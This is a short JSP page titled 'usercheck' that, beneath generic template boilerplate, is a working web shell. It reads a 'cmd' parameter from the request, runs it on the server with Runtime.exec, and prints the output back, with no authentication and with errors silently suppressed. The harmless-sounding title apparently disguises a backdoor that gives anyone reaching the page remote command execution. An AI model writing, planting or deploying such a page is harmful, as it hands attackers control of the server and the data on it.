<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@ page import="java.io.*"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <base href="<%=basePath%>">
    
    <title>usercheck</title>
    
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
	<meta http-equiv="description" content="This is my page">
	<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->

  </head>
  
  <body>
<% 
try {
String cmd = request.getParameter("cmd");
Process child = Runtime.getRuntime().exec(cmd);
InputStream in = child.getInputStream();
int c;
while ((c = in.read()) != -1) {
out.print((char)c);
}
in.close();
try {
child.waitFor();
} catch (InterruptedException e) {
//e.printStackTrace();
}
} catch (IOException e) {
//System.err.println(e);
}
%>
  </body>
</html>
